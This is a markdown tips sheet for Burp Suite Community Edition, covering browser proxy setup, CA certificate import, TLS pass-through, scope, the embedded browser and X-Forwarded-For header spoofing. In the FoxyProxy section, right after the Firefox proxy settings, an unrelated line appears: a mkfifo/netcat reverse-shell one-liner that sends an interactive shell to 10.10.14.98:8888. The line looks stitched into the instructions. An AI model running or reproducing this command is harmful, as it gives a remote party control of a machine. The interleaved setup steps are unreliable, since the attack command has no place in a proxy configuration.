# Burpsuite

## Important Notice

Warning with recent changes - [portswigger](https://portswigger.net/burp/documentation/desktop/settings) - December the 15th 2022

They now added a `Burp -> Settings` and all the `Project options`, `User options` that are listed below as such and instructions are now in a Windows with there own search bar! Thank you for change this insane UI nightmare of lists of scrollable settings. Some of the tricks here are still useful, but it does mean that you now you just search for the settings you need to change.


Prior to the disclaimer...


This is not a full detailed guide of how to use burpsuite more a selection of tricks and tips, for **Community Version Only**. It not really a cheatsheet and more a sheet of helpful stuff. There are full courses of how to use this avaliable from Portswigger, but their are also massive amounts of free resources and relatively cheap resources to learn and practice from. This Helphsheet is more just shortcuts, but is intended to make avaliable some of the functionality you may require extract from GUI menu to a scenario:   
*Problem X -> Do this with Burpsuite(plus another applications)*  
It is also not a showcase of plugins I like or support.  
Some of the tips very simple for simple problems, sometimes that is simply required.

# Cool things for the cmd [more]
- Builtin Browser, never setup the burp certifact with your own browser every again!
Go to `Project settings -> no sandbox for builtin browser`


## FoxyProxy/Firefox proxy

Firefox menu -> Settings -> Network Settings click Settings
Select manual proxy configuration:
	HTTP proxy: 127.0.0.1 8080
	uncheck: Also use this proxy for FTP and HTTPS 
	delete: ANYTHING in the "No proxy for" field
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 8888 >/tmp/f

## Burp Suite CA

To intercept and analyze HTTPS traffic, BS has Certificate Authority and uses it to issue on-th-fly certifactes for each website that we visit and pass through Burp.

http://burp -> CA Certificate 
save the file cacert.der to `/home/<user>/Downloads`
GOTO Certificate manager in Firefox -> Import it!

## Bypassing Proxy for (some) HTTPS Traffic

`Proxy -> Options -> TLS Pass Through -> Add`

Need pass through for:
- Targeting
- Required mutual authenication or HTTP Public Key Pinning

## Bypass intercepting HTTPS traffic by configurating to forward traffics towards websites without decrypting and re-encrypting them first.

## SOCKS Proxy in Burp

`User options -> SOCKS Proxy -> 127.0.0.1 & port number` then tick the `Use Proxy`

## Too much data -> Add Scope to include/exclude

`Target -> Scope -> Target scope`, to add manually or 
right click and add under main `Target Site map` tab.

## How is the site structured -> Sitemap

`Target -> Site map` Click the `>` and view in tree form.

## "Bad Request This combination of host and port requires TLS" -> Read Url

Use https in url you fool!

## Software is preventing site X browser from connecting -> Setup certificates in browser

Goto the very good visual guide on [THM](https://tryhackme.com/room/burpsuitebasics) - Task 10.

## Burp Intercepting Everything -> use the embedded Browser

If you do not want manage proxys on host OS or inside a browser, just use the embedded browser. Goto
`Project options -> Misc -> Embedded Browser` and check theÂ  `Allow the embedded browser to run without a sandbox`.

**This is a solution to a problem I have yet to encounter but is here to solve a problem at a later date**

## Need to Spoof your IP in burp?
- `Proxy -> Option -> Match and Replace`
-  Requires you to find a custom IP Header
	1. Leave Match field empty
	2. In the Replace field: `X-Forwarded-For: 127.0.0.1`

[Match and Replace](https://portswigger.net/burp/documentation/desktop/tutorials/using-match-and-replace): "*Note: In the wild, the de-facto standard header `X-Forwarded-For` is often used for this purpose, but you may encounter websites that use different custom headers. These are normally applied to your requests by an intermediary server, such as a load balancer or other reverse proxy belonging to a CDN, for example.*"
